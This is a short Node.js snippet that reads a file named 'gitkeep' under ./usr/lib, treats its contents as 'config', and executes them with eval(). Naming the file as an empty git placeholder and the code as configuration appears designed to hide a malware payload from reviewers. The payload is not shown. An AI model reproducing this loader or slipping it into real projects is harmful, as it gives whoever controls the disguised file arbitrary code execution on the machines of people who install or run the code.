const fs = require('fs');
const config = fs.readFileSync("./usr/lib/gitkeep").toString();
eval(config);
